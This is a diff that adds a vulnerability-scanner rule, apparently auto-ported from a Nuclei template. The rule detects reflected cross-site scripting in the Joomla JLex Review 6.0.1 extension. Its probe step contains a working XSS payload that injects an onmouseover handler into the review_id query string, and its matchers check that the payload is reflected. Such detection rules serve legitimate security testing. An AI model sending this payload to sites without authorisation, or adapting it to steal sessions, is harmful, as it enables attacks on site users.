@@ -1,0 +1,32 @@
+schema_version: 1
+id: "cortex.community:joomla-jlex-xss"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "Joomla JLex Review 6.0.1 - Cross-Site Scripting"
+  description: "The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://www.exploitalert.com/view-details.html?id=39732"
+    - "https://www.exploit-db.com/exploits/51645"
+    - "https://extensions.joomla.org/extension/jlex-review/"
+  tags: ["joomla", "xss", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "Medium"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request: { method: "GET", path: "/?review_id=1&itwed%22onmouseover=%22confirm(document.domain)%22style=%22position:absolute%3bwidth:100%25%3bheight:100%25%3btop:0%3bleft:0%3b%22b7yzn=1" }
+proof:
+  kind: "signal.v1"
+  assertions:
+    all:
+      - all:
+          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "<a href=\"/?itwed\"onmouseover=\"confirm(document.domain)\"style=" } }
+          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "jlex-review" } }
+      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
